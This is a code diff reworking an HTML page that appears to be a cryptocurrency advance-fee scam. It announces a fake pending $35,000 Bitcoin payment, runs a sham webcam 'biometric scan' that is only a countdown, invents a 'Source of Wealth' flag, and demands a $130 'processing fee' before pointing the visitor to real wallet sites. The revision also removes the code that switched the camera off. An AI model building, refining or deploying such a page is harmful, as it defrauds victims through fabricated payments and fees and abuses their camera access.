@@ -3,76 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bitcoin Transaction Node</title>
+    <title>Bitcoin Node | Secure Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; }
+        body { font-family: 'Inter', sans-serif; background-color: #f7931a; }
         h1, h2, h3, h4 { font-family: 'Outfit', sans-serif; }
         .font-mono { font-family: 'JetBrains Mono', monospace; }
-        
-        .bg-bitcoin-yellow { background-color: #f7931a; }
-        .text-bitcoin-yellow { color: #f7931a; }
-        .border-bitcoin-yellow { border-color: #f7931a; }
         
         .btc-gradient {
             background: linear-gradient(135deg, #f7931a 0%, #ffab40 100%);
         }
 
-        .receipt-shadow {
-            box-shadow: 0 25px 50px -12px rgba(247, 147, 26, 0.25);
-        }
-
-        .face-scan-ring {
-            stroke-dasharray: 754;
-            stroke-dashoffset: 754;
-            transition: stroke-dashoffset 0.1s linear;
+        .glass-panel {
+            background: rgba(30, 35, 41, 0.95);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .step-transition {
-            transition: opacity 0.4s ease, transform 0.4s ease;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .hidden { display: none !important; }
+        .hidden { display: none !important; opacity: 0; transform: scale(0.95) translateY(20px); }
         
-        @keyframes pulse-yellow {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(0.98); }
+        @keyframes scan-line {
+            0% { top: 0%; opacity: 0; }
+            50% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
         }
-        .animate-pulse-yellow { animation: pulse-yellow 2s ease-in-out infinite; }
-        
-        .check-box {
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: rgba(247, 147, 26, 0.5);
+            box-shadow: 0 0 15px #f7931a;
+            animation: scan-line 2s infinite ease-in-out;
         }
-        
-        .glass-panel {
-            background: rgba(30, 35, 41, 0.95);
-            backdrop-filter: blur(10px);
+
+        .text-glow {
+            text-shadow: 0 0 20px rgba(247, 147, 26, 0.5);
         }
     </style>
 </head>
-<body class="bg-[#f7931a] text-slate-100 min-h-screen relative overflow-x-hidden flex items-center justify-center p-4">
+<body class="min-h-screen flex items-center justify-center p-4 overflow-x-hidden">
 
-    <!-- Professional Background Pattern -->
+    <!-- Professional background decoration -->
     <div class="fixed inset-0 pointer-events-none opacity-20 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
-    <div class="fixed inset-0 bg-gradient-to-b from-black/20 to-black/40 pointer-events-none"></div>
+    <div class="fixed inset-0 bg-gradient-to-b from-black/40 to-black/80 pointer-events-none"></div>
 
     <main class="relative z-10 w-full flex items-center justify-center">
         
         <!-- STEP 1: ADDRESS CONFIRMATION -->
-        <div id="step-address" class="w-full max-w-lg glass-panel rounded-[32px] shadow-2xl border border-white/10 overflow-hidden step-transition">
-            <div class="btc-gradient h-2 w-full"></div>
+        <div id="step-address" class="w-full max-w-lg glass-panel rounded-[32px] shadow-2xl overflow-hidden step-transition">
+            <div class="btc-gradient h-1.5 w-full"></div>
             <div class="p-8 md:p-12 space-y-10">
-                <div class="flex flex-col items-center text-center space-y-4">
-                    <div class="w-24 h-24 bg-[#f7931a]/10 rounded-full flex items-center justify-center border border-[#f7931a]/30">
+                <div class="flex flex-col items-center text-center space-y-6">
+                    <div class="w-24 h-24 bg-[#f7931a]/10 rounded-full flex items-center justify-center border border-[#f7931a]/30 shadow-[0_0_40px_rgba(247,147,26,0.15)]">
                         <i data-lucide="bitcoin" class="w-12 h-12 text-[#f7931a]"></i>
                     </div>
-                    <h1 class="text-3xl font-bold tracking-tight text-white">Incoming Transaction</h1>
-                    <p class="text-slate-400 text-lg">A payment of <span class="text-[#f7931a] font-bold">$35,000.00</span> is pending</p>
+                    <div>
+                        <h1 class="text-3xl font-bold tracking-tight text-white mb-2">Incoming Transaction</h1>
+                        <p class="text-slate-400 text-lg">A payment of <span class="text-[#f7931a] font-bold text-glow">$35,000.00</span> is pending</p>
+                    </div>
                 </div>
 
-                <div class="bg-black/40 p-6 rounded-2xl border border-white/5 space-y-4">
+                <div class="bg-black/40 p-6 rounded-2xl border border-white/5 space-y-3">
                     <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Recipient BTC Address</label>
                     <div class="flex items-center gap-3 bg-white/5 p-4 rounded-xl border border-white/10">
                         <input type="text" value="3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT" readonly class="bg-transparent w-full font-mono text-xs md:text-sm outline-none text-slate-200">
@@ -80,51 +77,51 @@
                     </div>
                 </div>
 
-                <div class="space-y-4" id="checkbox-group">
-                    <div class="flex items-start gap-4 group cursor-pointer p-4 rounded-2xl border border-transparent hover:bg-white/5 transition-all" onclick="toggleCheck(this, 'check-1')">
-                        <div class="mt-0.5 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5 check-box">
+                <div id="checkbox-container" class="space-y-3">
+                    <div class="flex items-start gap-4 p-4 rounded-2xl border border-transparent hover:bg-white/5 cursor-pointer transition-all group" onclick="toggleCheck(this, 1)">
+                        <div class="check-box mt-1 min-w-6 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5">
                             <i data-lucide="check" class="w-4 h-4 text-white opacity-0 transition-opacity"></i>
                         </div>
-                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200 transition-colors">I confirm that this Bitcoin address belongs to me and I have verified the hash.</p>
+                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200">I confirm that this Bitcoin address belongs to me and I have verified the hash.</p>
                     </div>
-                    <div class="flex items-start gap-4 group cursor-pointer p-4 rounded-2xl border border-transparent hover:bg-white/5 transition-all" onclick="toggleCheck(this, 'check-2')">
-                        <div class="mt-0.5 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5 check-box">
+                    <div class="flex items-start gap-4 p-4 rounded-2xl border border-transparent hover:bg-white/5 cursor-pointer transition-all group" onclick="toggleCheck(this, 2)">
+                        <div class="check-box mt-1 min-w-6 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5">
                             <i data-lucide="check" class="w-4 h-4 text-white opacity-0 transition-opacity"></i>
                         </div>
-                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200 transition-colors">I confirm that I haven't shared my private key with anyone and my seed is secured.</p>
+                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200">I confirm that I haven't shared my private key with anyone and my seed is secured.</p>
                     </div>
-                    <div class="flex items-start gap-4 group cursor-pointer p-4 rounded-2xl border border-transparent hover:bg-white/5 transition-all" onclick="toggleCheck(this, 'check-3')">
-                        <div class="mt-0.5 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5 check-box">
+                    <div class="flex items-start gap-4 p-4 rounded-2xl border border-transparent hover:bg-white/5 cursor-pointer transition-all group" onclick="toggleCheck(this, 3)">
+                        <div class="check-box mt-1 min-w-6 w-6 h-6 rounded-lg border border-white/20 flex items-center justify-center transition-all bg-white/5">
                             <i data-lucide="check" class="w-4 h-4 text-white opacity-0 transition-opacity"></i>
                         </div>
-                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200 transition-colors">I understand that funds sent to the wrong address cannot be refunded.</p>
+                        <p class="text-sm text-slate-400 leading-relaxed group-hover:text-slate-200">I understand that funds sent to the wrong address cannot be refunded.</p>
                     </div>
                 </div>
 
-                <div id="auto-loader" class="hidden flex flex-col items-center space-y-4 py-4">
-                    <i data-lucide="loader-2" class="w-10 h-10 text-[#f7931a] animate-spin"></i>
-                    <p class="text-sm font-bold uppercase tracking-[0.2em] text-[#f7931a]">Verifying Approvals...</p>
+                <div id="loader-area" class="hidden flex flex-col items-center space-y-4 py-8">
+                    <i data-lucide="loader-2" class="w-12 h-12 text-[#f7931a] animate-spin"></i>
+                    <p class="text-sm font-bold uppercase tracking-[0.2em] text-[#f7931a] animate-pulse">Verifying Approvals...</p>
                 </div>
             </div>
         </div>
 
-        <!-- STEP 2: BTC RECEIPT -->
-        <div id="step-receipt" class="hidden w-full max-w-md bg-white text-slate-900 rounded-[40px] p-10 shadow-2xl relative overflow-hidden step-transition receipt-shadow">
+        <!-- STEP 2: RECEIPT -->
+        <div id="step-receipt" class="hidden w-full max-w-md bg-white rounded-[40px] p-10 shadow-2xl relative overflow-hidden step-transition">
             <div class="absolute top-0 left-0 w-full h-2 btc-gradient"></div>
             <div class="space-y-8">
                 <div class="text-center space-y-2">
-                    <div class="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <div class="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
                         <i data-lucide="file-text" class="w-10 h-10 text-orange-600"></i>
                     </div>
-                    <h2 class="text-2xl font-bold tracking-tight uppercase">Transaction Receipt</h2>
-                    <p class="text-slate-500 font-mono text-[10px]">TXID: b48f...92da</p>
+                    <h2 class="text-2xl font-bold uppercase text-slate-900 tracking-tight">Transaction Receipt</h2>
+                    <p class="text-slate-400 font-mono text-xs">TXID: b48f...92da</p>
                 </div>
 
-                <div class="space-y-4 border-y border-slate-100 py-6">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Amount</span><span class="text-2xl font-bold">$35,000.00</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Asset</span><span class="font-bold flex items-center gap-2"><i data-lucide="bitcoin" class="w-4 h-4 text-[#f7931a]"></i> BTC</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Network</span><span class="font-bold">Mainnet-Core</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Verification</span><span class="font-bold text-red-500 flex items-center gap-1 bg-red-50 px-2 py-1 rounded text-xs"><i data-lucide="alert-circle" class="w-3 h-3"></i> INCOMPLETE</span></div>
+                <div class="space-y-5 border-y border-slate-100 py-8">
+                    <div class="flex justify-between items-center"><span class="text-slate-400 text-xs font-bold uppercase tracking-widest">Amount</span><span class="text-2xl font-bold text-slate-900">$35,000.00</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-400 text-xs font-bold uppercase tracking-widest">Asset</span><span class="font-bold flex items-center gap-2 text-slate-700"><i data-lucide="bitcoin" class="w-4 h-4 text-[#f7931a]"></i> BTC</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-400 text-xs font-bold uppercase tracking-widest">Network</span><span class="font-bold text-slate-700">Mainnet-Core</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-400 text-xs font-bold uppercase tracking-widest">Verification</span><span class="font-bold text-red-600 flex items-center gap-1.5 bg-red-50 px-3 py-1 rounded-md text-xs border border-red-100"><i data-lucide="alert-circle" class="w-3.5 h-3.5"></i> INCOMPLETE</span></div>
                 </div>
 
                 <div class="bg-slate-50 p-6 rounded-2xl space-y-2 border border-slate-100">
@@ -132,235 +129,186 @@
                     <p class="text-sm text-slate-600 leading-relaxed font-medium">Identity synchronization is required to execute the final fund release.</p>
                 </div>
 
-                <button onclick="showStep('face')" class="w-full bg-slate-900 text-white font-bold py-6 rounded-2xl shadow-xl hover:bg-black transition-all text-lg uppercase tracking-widest hover:-translate-y-1">
+                <button onclick="changeStep('face')" class="w-full bg-slate-900 text-white font-bold py-5 rounded-xl shadow-xl hover:bg-black transition-all uppercase tracking-widest hover:-translate-y-1">
                     SYNCHRONIZE NOW
                 </button>
             </div>
         </div>
 
         <!-- STEP 3: FACE VERIFICATION -->
-        <div id="step-face" class="hidden w-full max-w-lg glass-panel rounded-[40px] p-12 border border-white/10 text-center space-y-10 step-transition shadow-2xl">
-            <div class="space-y-2">
-                <h2 class="text-2xl font-bold uppercase tracking-tight text-white">Biometric Node Sync</h2>
+        <div id="step-face" class="hidden w-full max-w-lg glass-panel rounded-[40px] p-12 text-center space-y-10 step-transition shadow-2xl">
+            <div class="space-y-3">
+                <h2 class="text-2xl font-bold uppercase text-white tracking-tight">Biometric Node Sync</h2>
                 <p class="text-slate-400 text-sm">Please align your face for biometric authentication</p>
             </div>
 
             <div class="relative w-64 h-64 mx-auto">
-                <div class="w-full h-full rounded-full border-4 border-slate-800 overflow-hidden bg-slate-900 flex items-center justify-center relative shadow-inner">
-                    <i id="camera-icon" data-lucide="user" class="w-32 h-32 text-slate-700"></i>
-                    <video id="webcam" class="hidden w-full h-full object-cover transform scale-x-[-1]" autoplay playsinline></video>
+                <div class="w-full h-full rounded-full border-4 border-slate-800 overflow-hidden bg-slate-900 flex items-center justify-center relative shadow-inner z-10">
+                    <i id="user-placeholder" data-lucide="user" class="w-32 h-32 text-slate-700"></i>
+                    <video id="webcam" class="hidden w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
+                    <div id="scanner-line" class="hidden scan-line"></div>
                 </div>
-                <svg class="absolute inset-[-15px] w-[calc(100%+30px)] h-[calc(100%+30px)] transform -rotate-90 z-20 pointer-events-none">
-                    <circle cx="50%" cy="50%" r="48%" stroke="rgba(255,255,255,0.05)" stroke-width="8" fill="transparent" />
-                    <circle id="scan-progress" cx="50%" cy="50%" r="48%" stroke="#f7931a" stroke-width="8" fill="transparent" class="face-scan-ring" stroke-linecap="round" />
+                <svg class="absolute inset-[-15px] w-[calc(100%+30px)] h-[calc(100%+30px)] -rotate-90 z-20">
+                    <circle cx="50%" cy="50%" r="48%" stroke="rgba(255,255,255,0.05)" stroke-width="6" fill="transparent" />
+                    <circle id="scan-progress" cx="50%" cy="50%" r="48%" stroke="#f7931a" stroke-width="6" fill="transparent" stroke-dasharray="754" stroke-dashoffset="754" stroke-linecap="round" style="transition: stroke-dashoffset 5s linear;" />
                 </svg>
             </div>
 
-            <div class="space-y-6 min-h-[140px] flex flex-col justify-end">
-                <button id="run-scan-btn" onclick="startScan()" class="bg-white text-black font-bold py-6 px-12 rounded-2xl hover:bg-slate-200 transition-all text-lg tracking-widest uppercase mx-auto flex items-center gap-3 shadow-2xl hover:-translate-y-1">
-                    <i data-lucide="scan" class="w-6 h-6"></i> START BIOMETRIC SCAN
+            <div class="h-24 flex flex-col justify-end items-center">
+                <button id="scan-btn" onclick="startScan()" class="bg-white text-black font-bold py-4 px-10 rounded-xl hover:bg-slate-200 transition-all uppercase tracking-widest flex items-center gap-3 shadow-xl">
+                    <i data-lucide="scan" class="w-5 h-5"></i> START BIOMETRIC SCAN
                 </button>
-                <div id="scan-feedback" class="hidden space-y-4">
-                    <div class="text-[#f7931a] font-bold tracking-[0.3em] text-xs animate-pulse-yellow uppercase">Analyzing Facial Markers...</div>
-                    <p id="timer" class="text-slate-500 font-mono text-xs bg-white/5 inline-block px-4 py-1 rounded-full">5s remaining</p>
+                <div id="scanning-info" class="hidden space-y-3">
+                    <p class="text-[#f7931a] font-bold text-xs tracking-[0.3em] uppercase animate-pulse">Analyzing Facial Markers...</p>
+                    <p id="timer" class="text-slate-500 font-mono text-xs bg-white/5 px-4 py-1.5 rounded-full border border-white/10">5s remaining</p>
                 </div>
             </div>
         </div>
 
         <!-- STEP 4: APPEAL -->
-        <div id="step-appeal" class="hidden w-full max-w-xl glass-panel rounded-[40px] border border-white/10 overflow-hidden shadow-2xl step-transition">
-            <div class="p-12 space-y-10">
-                <div class="flex items-center gap-6 pb-8 border-b border-white/5">
-                    <div class="w-20 h-20 bg-emerald-500/10 text-emerald-500 rounded-full flex items-center justify-center border border-emerald-500/20 shadow-lg">
-                        <i data-lucide="user-check" class="w-10 h-10"></i>
-                    </div>
-                    <div>
-                        <h3 class="text-2xl font-bold uppercase tracking-tight text-white">Identity Confirmed</h3>
-                        <div class="flex items-center gap-2 mt-1">
-                            <span class="text-slate-400 text-sm">Target Account:</span>
-                            <span class="font-bold text-emerald-400 uppercase tracking-widest">Finnur</span>
-                        </div>
+        <div id="step-appeal" class="hidden w-full max-w-xl glass-panel rounded-[40px] p-12 step-transition shadow-2xl">
+            <div class="flex items-center gap-6 pb-8 border-b border-white/5 mb-8">
+                <div class="w-20 h-20 bg-emerald-500/10 text-emerald-500 rounded-full flex items-center justify-center border border-emerald-500/20 shadow-lg">
+                    <i data-lucide="user-check" class="w-10 h-10"></i>
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold uppercase text-white">Identity Confirmed</h3>
+                    <div class="flex items-center gap-2 mt-2">
+                        <span class="text-slate-400 text-sm">Target Account:</span>
+                        <span class="font-bold text-emerald-400 uppercase tracking-widest text-sm bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">Finnur</span>
                     </div>
                 </div>
-
-                <div class="space-y-8">
-                    <div class="grid grid-cols-2 gap-6">
-                        <div class="bg-black/40 p-6 rounded-2xl border border-white/5 shadow-inner">
-                            <p class="text-[10px] font-bold text-slate-500 uppercase mb-2 tracking-widest">Payout Amount</p>
-                            <p class="text-2xl font-bold text-white">$35,000.00</p>
-                        </div>
-                        <div class="bg-black/40 p-6 rounded-2xl border border-white/5 shadow-inner">
-                            <p class="text-[10px] font-bold text-slate-500 uppercase mb-2 tracking-widest">Secured By</p>
-                            <p class="text-2xl font-bold flex items-center gap-2 text-white"><i data-lucide="shield-check" class="w-6 h-6 text-blue-400"></i> ZENGO</p>
-                        </div>
-                    </div>
-
-                    <div class="bg-red-500/10 border border-red-500/20 p-8 rounded-3xl space-y-6 relative overflow-hidden">
-                        <div class="absolute -top-4 -right-4 opacity-5">
-                            <i data-lucide="alert-triangle" class="w-32 h-32 text-red-500"></i>
-                        </div>
-                        
-                        <div class="flex items-center gap-3 text-red-500">
-                            <i data-lucide="alert-triangle" class="w-6 h-6"></i>
-                            <h4 class="font-bold uppercase tracking-widest text-sm">Security Alert: Action Required</h4>
-                        </div>
-                        <p class="text-sm text-slate-400 leading-relaxed">
-                            The automated verification system flagged <span class="text-white font-bold">Source of Wealth</span> documentation as missing. To override this and process the manual release, a <span class="text-[#f7931a] font-bold">Verification Appeal Execution</span> is mandatory.
-                        </p>
-                        <div class="bg-black/30 p-4 rounded-xl border border-white/5">
-                            <p class="text-xs text-slate-400 leading-relaxed">
-                                A processing fee of <span class="text-white font-bold text-lg">$130.00</span> is required for administrative override. Funds cannot be released without this final confirmation.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-
-                <button onclick="showStep('final')" class="w-full bg-[#f7931a] hover:bg-[#ffab40] text-black font-bold py-6 rounded-2xl shadow-2xl transition-all text-xl tracking-widest uppercase hover:-translate-y-1">
-                    EXECUTE APPEAL OVERRIDE
-                </button>
             </div>
+
+            <div class="grid grid-cols-2 gap-4 mb-8">
+                <div class="bg-black/40 p-6 rounded-2xl border border-white/5">
+                    <p class="text-[10px] font-bold text-slate-500 uppercase mb-2 tracking-widest">Payout Amount</p>
+                    <p class="text-2xl font-bold text-white">$35,000.00</p>
+                </div>
+                <div class="bg-black/40 p-6 rounded-2xl border border-white/5">
+                    <p class="text-[10px] font-bold text-slate-500 uppercase mb-2 tracking-widest">Secured By</p>
+                    <p class="text-2xl font-bold flex items-center gap-2 text-white"><i data-lucide="shield-check" class="w-6 h-6 text-blue-400"></i> ZENGO</p>
+                </div>
+            </div>
+
+            <div class="bg-red-500/10 border border-red-500/20 p-8 rounded-3xl space-y-5 mb-8">
+                <div class="flex items-center gap-3 text-red-500">
+                    <i data-lucide="alert-triangle" class="w-5 h-5"></i>
+                    <h4 class="font-bold uppercase tracking-widest text-sm">Security Alert: Action Required</h4>
+                </div>
+                <p class="text-sm text-slate-300 leading-relaxed">
+                    The automated verification system flagged <span class="text-white font-bold">Source of Wealth</span> documentation as missing. To override this, a <span class="text-[#f7931a] font-bold">Verification Appeal Execution</span> is mandatory.
+                </p>
+                <div class="bg-black/30 p-4 rounded-xl border border-white/5">
+                    <p class="text-xs text-slate-400">
+                        A processing fee of <span class="text-white font-bold text-base">$130.00</span> is required for administrative override.
+                    </p>
+                </div>
+            </div>
+
+            <button onclick="changeStep('final')" class="w-full bg-[#f7931a] hover:bg-[#ffab40] text-black font-bold py-6 rounded-2xl shadow-2xl transition-all uppercase tracking-widest hover:-translate-y-1">
+                EXECUTE APPEAL OVERRIDE
+            </button>
         </div>
 
         <!-- STEP 5: FINAL -->
-        <div id="step-final" class="hidden w-full max-w-sm glass-panel rounded-[40px] p-12 border border-white/10 text-center space-y-10 shadow-2xl step-transition">
-            <div id="final-loader" class="space-y-6 py-10">
+        <div id="step-final" class="hidden w-full max-w-sm glass-panel rounded-[40px] p-12 text-center space-y-10 shadow-2xl step-transition">
+            <div id="final-loading" class="py-12 space-y-8">
                 <i data-lucide="refresh-cw" class="w-16 h-16 text-[#f7931a] animate-spin mx-auto"></i>
                 <p class="text-slate-400 font-bold uppercase tracking-[0.2em] text-xs">Synchronizing Core Nodes...</p>
             </div>
-            <div id="final-buttons" class="hidden space-y-6">
-                <div class="space-y-2 mb-8">
+            <div id="final-success" class="hidden space-y-8">
+                <div class="space-y-3">
+                    <div class="w-16 h-16 bg-emerald-500/20 rounded-full flex items-center justify-center border border-emerald-500/30 mx-auto mb-6">
+                        <i data-lucide="check-circle-2" class="w-8 h-8 text-emerald-500"></i>
+                    </div>
                     <h3 class="text-xl font-bold uppercase text-white">Network Sync Ready</h3>
                     <p class="text-slate-400 text-sm">Connect your preferred wallet to finalize</p>
                 </div>
-                <a href="https://ZENGO.com" target="_blank" class="block w-full bg-[#f7931a] hover:bg-[#ffab40] text-black font-bold py-6 rounded-2xl transition-all text-lg shadow-2xl uppercase tracking-widest hover:-translate-y-1">
-                    ZENGO GATEWAY
-                </a>
-                <a href="https://trustwallet.com" target="_blank" class="block w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-6 rounded-2xl transition-all text-lg shadow-2xl uppercase tracking-widest hover:-translate-y-1">
-                    TRUST PROTOCOL
-                </a>
+                <div class="space-y-4">
+                    <a href="https://ZENGO.com" target="_blank" class="block w-full bg-[#f7931a] text-black font-bold py-4 rounded-xl uppercase tracking-widest hover:brightness-110">ZENGO Gateway</a>
+                    <a href="https://trustwallet.com" target="_blank" class="block w-full bg-blue-600 text-white font-bold py-4 rounded-xl uppercase tracking-widest hover:bg-blue-500">Trust Protocol</a>
+                </div>
             </div>
         </div>
     </main>
 
     <script>
         lucide.createIcons();
+        let checks = { 1: false, 2: false, 3: false };
 
-        let checks = { 'check-1': false, 'check-2': false, 'check-3': false };
-        let transitioning = false;
-
-        function toggleCheck(element, id) {
-            if (transitioning) return;
-            
+        function toggleCheck(el, id) {
             checks[id] = !checks[id];
-            const checkbox = element.querySelector('.check-box');
-            const icon = checkbox.querySelector('i');
+            const box = el.querySelector('.check-box');
+            const icon = box.querySelector('i');
             
             if (checks[id]) {
-                checkbox.classList.add('bg-[#f7931a]', 'border-[#f7931a]');
-                checkbox.classList.remove('bg-white/5', 'border-white/20');
+                box.classList.add('bg-[#f7931a]', 'border-[#f7931a]');
                 icon.classList.remove('opacity-0');
             } else {
-                checkbox.classList.remove('bg-[#f7931a]', 'border-[#f7931a]');
-                checkbox.classList.add('bg-white/5', 'border-white/20');
+                box.classList.remove('bg-[#f7931a]', 'border-[#f7931a]');
                 icon.classList.add('opacity-0');
             }
 
-            checkAllConditions();
-        }
-
-        function checkAllConditions() {
-            const allChecked = Object.values(checks).every(v => v === true);
-            if (allChecked) {
-                transitioning = true;
-                document.getElementById('checkbox-group').classList.add('opacity-40', 'pointer-events-none');
-                document.getElementById('auto-loader').classList.remove('hidden');
-                
-                setTimeout(() => {
-                    proceedToReceipt();
-                }, 1500);
+            if (Object.values(checks).every(v => v === true)) {
+                document.getElementById('checkbox-container').style.opacity = '0.3';
+                document.getElementById('checkbox-container').style.pointerEvents = 'none';
+                document.getElementById('loader-area').classList.remove('hidden');
+                setTimeout(() => changeStep('receipt'), 2000);
             }
         }
 
-        function showStep(stepId) {
-            document.querySelectorAll('.step-transition').forEach(el => {
-                el.classList.add('opacity-0', 'scale-95');
-                setTimeout(() => el.classList.add('hidden'), 400);
-            });
+        function changeStep(stepId) {
+            const current = document.querySelector('main > div:not(.hidden)');
+            current.classList.add('hidden');
             
             setTimeout(() => {
-                const nextStep = document.getElementById('step-' + stepId);
-                nextStep.classList.remove('hidden');
-                setTimeout(() => {
-                    nextStep.classList.remove('opacity-0', 'scale-95');
-                    nextStep.classList.add('opacity-100', 'scale-100');
-                }, 50);
-                
-                if (stepId === 'face') setupCamera();
-                if (stepId === 'final') startFinalLoader();
-                
+                const next = document.getElementById('step-' + stepId);
+                next.classList.remove('hidden');
                 lucide.createIcons();
-            }, 400);
+                
+                if (stepId === 'face') initCamera();
+                if (stepId === 'final') initFinal();
+            }, 500);
         }
 
-        function proceedToReceipt() {
-            showStep('receipt');
-        }
-
-        async function setupCamera() {
-            const video = document.getElementById('webcam');
+        async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.classList.remove('hidden');
-                    document.getElementById('camera-icon').classList.add('hidden');
+                    document.getElementById('user-placeholder').classList.add('hidden');
                 };
-            } catch (err) {
-                console.log("Camera access denied or unavailable");
-            }
+            } catch (err) { console.error("Camera error:", err); }
         }
 
         function startScan() {
-            document.getElementById('run-scan-btn').classList.add('hidden');
-            document.getElementById('scan-feedback').classList.remove('hidden');
+            document.getElementById('scan-btn').classList.add('hidden');
+            document.getElementById('scanning-info').classList.remove('hidden');
+            document.getElementById('scanner-line').classList.remove('hidden');
             
             const ring = document.getElementById('scan-progress');
-            const timerText = document.getElementById('timer');
-            const circumference = 754;
-            let duration = 5000;
-            let start = null;
+            ring.style.strokeDashoffset = "0";
 
-            function animate(timestamp) {
-                if (!start) start = timestamp;
-                let progress = timestamp - start;
-                let percent = Math.min(progress / duration, 1);
-                
-                ring.style.strokeDashoffset = circumference - (percent * circumference);
-                timerText.innerText = Math.ceil((duration - progress) / 1000) + "s remaining";
-
-                if (progress < duration) {
-                    requestAnimationFrame(animate);
-                } else {
-                    showStep('appeal');
-                    stopCamera();
+            let count = 5;
+            const timer = setInterval(() => {
+                count--;
+                document.getElementById('timer').innerText = count + "s remaining";
+                if (count <= 0) {
+                    clearInterval(timer);
+                    changeStep('appeal');
                 }
-            }
-            requestAnimationFrame(animate);
+            }, 1000);
         }
 
-        function stopCamera() {
-            const video = document.getElementById('webcam');
-            if (video && video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        function startFinalLoader() {
+        function initFinal() {
             setTimeout(() => {
-                document.getElementById('final-loader').classList.add('hidden');
-                document.getElementById('final-buttons').classList.remove('hidden');
+                document.getElementById('final-loading').classList.add('hidden');
+                document.getElementById('final-success').classList.remove('hidden');
                 lucide.createIcons();
-            }, 3500);
+            }, 2500);
         }
     </script>
 </body>
